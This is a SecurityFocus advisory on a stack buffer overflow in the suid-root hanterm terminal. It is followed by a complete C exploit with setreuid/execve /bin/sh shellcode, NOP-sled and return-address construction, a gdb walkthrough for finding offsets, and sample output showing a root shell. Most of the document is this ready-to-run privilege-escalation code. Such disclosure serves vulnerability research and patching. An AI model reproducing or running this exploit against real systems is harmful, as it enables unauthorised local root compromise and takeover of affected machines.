source: http://www.securityfocus.com/bid/4050/info

Hanterm is a replacement for xterm which includes Hangul support, used for Korean language systems.

A buffer overflow error exists in hanterm. If it is called locally with a maliciously constructed parameter, it is possible to overflow a buffer. This can result in the return address of a stack frame being overwritten, and lead to the execution of arbitrary code.

As hanterm runs suid root on some systems, exploitation of this vulnerability may result in a local root compromise. 

/*
**
** How to exploit?
**
** [x82@xpl017elz x82]$ cp /usr/X11R6/bin/hanterm .
** [x82@xpl017elz x82]$ gdb -q hanterm
** (no debugging symbols found)...(gdb) r -display 61.xx.177.27:0 -fn `perl -e
** 'print "x"x80'`
**  
** Starting program: /home/noname/hanterm -display 61.xx.177.27:0 -fn `perl -e
** 'print "x"x80'`
** (no debugging symbols found)...(no debugging symbols found)...
** (no debugging symbols found)...(no debugging symbols found)...
** (no debugging symbols found)...(no debugging symbols found)...
** (no debugging symbols found)...
** Program received signal SIGSEGV, Segmentation fault.
** 0x80520e6 in strcpy () at ../sysdeps/generic/strcpy.c:30
** 30      ../sysdeps/generic/strcpy.c: �׷� �����̳� ���丮�� ���.
** (gdb) info reg $esp
** esp            0xbfffe6b8       -1073748296
** (gdb) x/80 0xbffffb00
** 0xbffffb00:     0x65746e61      0x2d006d72      0x70736964      0x0079616c
** 0xbffffb10:     0x332e3136      0x37312e37      0x37322e37      0x2d00303a
** 0xbffffb20:     0x78006e66      0x78787878      0x78787878      0x78787878
** 0xbffffb30:     0x78787878      0x78787878      0x78787878      0x78787878
** 0xbffffb40:     0x78787878      0x78787878      0x78787878      0x78787878
** 0xbffffb50:     0x78787878      0x78787878      0x78787878      0x78787878
** 0xbffffb60:     0x78787878      0x78787878      0x78787878      0x78787878
** 0xbffffb70:     0x00787878      0x5353454c      0x4e45504f      0x656c7c3d
**     ...             ...            ...              ...             ...
** 0xbffffc10:     0x2d2a2d36      0x3563736b      0x2e313036      0x37383931
** 0xbffffc20:     0x2d2c302d      0x6f6b2d2a      0x2d676964      0x6964656d
** 0xbffffc30:     0x722d6d75      0x726f6e2d      0x2d6c616d      0x2d38312d
** (gdb)                
** 
** Buffer Structure
**
** [ data addr: 80byte ] + [ ebp addr: 4byte ] + [ ret addr: 4byte ] = 88byte
**
** The return until the address the whole it contains and,
** it puts in an option. 
**
** [x82@xpl017elz x82]$ ./exploit
** 
** XFree86 Version 3.x.x ~ 4.x.x /usr/X11R6/bin/hanterm exploit
** Default: [ data addr ] + [ ebp addr ] + [ ret addr ] = 88byte
** 
**                         Exploit made by Xpl017Elz
** 
** Display HOST_IP: 255.255.255.255:0
** Jumping Address: 0xbffffb74
** 
** Segmentation fault
** [x82@xpl017elz x82]$  
**
** It calculates the offset. 
** Namely, when 0xbffffb20 from 0xbffffb70 until it catches in between, 
** it will be suitable.
**
** [x82@xpl017elz x82]$ ./exploit -a 61.xx.177.27:0 -o 2370 -b 88
** 
** XFree86 Version 3.x.x ~ 4.x.x /usr/X11R6/bin/hanterm exploit
** Default: [ data addr ] + [ ebp addr ] + [ ret addr ] = 88byte
** 
**                         Exploit made by Xpl017Elz
** 
** Display HOST_IP: 61.xx.177.27:0
** Jumping Address: 0xbffffb26
** 
** bash#        
**
** Ooops! it's rootshell :-)
**
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>. 
** My World: http://x82.i21c.net
**
*/

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define DFOFS 2400 
#define DFIP "255.255.255.255:0"
#define DFBUF 88 

/*
** [ data addr: 80byte ] + [ ebp addr: 4byte ] + [ ret addr: 4byte ] = 88byte
*/

char shellcode[] = /* 53byte shellcode */
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80" /* setreuid(0,0); */
"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46"
"\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
"\x08\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd"
"\x80\xe8\xde\xff\xff\xff/bin/sh";

unsigned long sp(void) {
__asm__("movl %esp,%eax");
}

main(int argc, char *argv[]) {

int rufp, fpru, jobst,
    ferbuf, num=DFBUF,
    ofs=DFOFS;

long addr;

char buffer[2000],
     hoip[] = DFIP;

extern char *optarg;

banrl();

while ((jobst = getopt(argc, argv, "a:o:b:")) !=EOF)
switch (jobst) {
case 'a': strcpy(hoip, optarg);
break;
case 'o': ofs = atoi(optarg);
break;
case 'b': num = atoi(optarg);
break;
case '?': usages(argv[0]); 
exit(0);
}

printf(" Display HOST_IP: %s\n",hoip);
addr = sp() +ofs; // -ofs;
printf(" Jumping Address: %p\n\n",addr); 
ferbuf = num - sizeof(shellcode) -4;

bzero(&buffer,2000);
for(rufp=0; rufp<=ferbuf; rufp++) {
buffer[rufp] = NOP;
}

for(fpru=0; fpru<=52; fpru++) {
buffer[rufp++] = shellcode[fpru];
}
buffer[rufp++] =     addr & 0xff;
buffer[rufp++] = addr>> 8 & 0xff;
buffer[rufp++] = addr>>16 & 0xff;
buffer[rufp++] = addr>>24 & 0xff;

execl("/usr/X11R6/bin/hanterm", "hanterm",
"-display", hoip, "-fn", buffer, NULL);  

exit(0);

}

usages(char *var) {

printf("\n Usage:\n
 %s -a [host_ip:0] -o [offset] -b [buffer size] (data addr~ return addr)\n",var);
printf(" Default: %s -a 61.xx.177.27:0 -o 2400 -b 88\n\n",var); 

}

banrl() {

printf("\n XFree86 Version 3.x.x ~ 4.x.x /usr/X11R6/bin/hanterm exploit\n");
printf(" Default: [ data addr ] + [ ebp addr ] + [ ret addr ] = 88byte\n\n");
printf("\t\t\t Exploit made by Xpl017Elz\n\n");

}